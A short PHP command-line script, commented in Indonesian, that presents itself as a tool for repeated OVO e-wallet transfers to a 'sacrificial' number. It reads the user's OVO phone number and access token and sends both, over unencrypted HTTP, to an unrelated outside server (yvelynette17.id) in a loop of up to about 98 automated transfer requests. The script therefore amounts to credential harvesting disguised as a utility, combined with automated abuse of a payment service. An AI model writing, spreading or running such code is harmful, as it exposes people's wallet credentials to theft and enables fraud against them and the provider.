<?php 
echo ' Nomor Ovo: ';
$account = trim(fgets(STDIN)); // nomor ovo 
echo ' Token Ovo: ';
$access = trim(fgets(STDIN)); // access ovo 
echo ' Jumlah Tf (max 100): ';
$amount = trim(fgets(STDIN)); // jumlah tf (bisa rp1) 
echo ' Nomor Tumbal: ';
$transfer_to = trim(fgets(STDIN)); // nomor ovo tumbal 
$max=100; //akan otomatis close apabila sudah max 
$i=2; while ($i < $max) 
{ 	
$tf = json_decode(file_get_contents("http://yvelynette17.id/ovo/transfer.php?phone_number=$account&amount=$amount&access_code=$access&to_account=$transfer_to")); 	
if($tf->error == false) 	{
 		$i++; 		
echo "[SUCCESS] " . $tf->message . " [$i]" . "\n"; 	
} else {
 		echo "[FAILED] " . $tf->message . "\n"; 	} } 
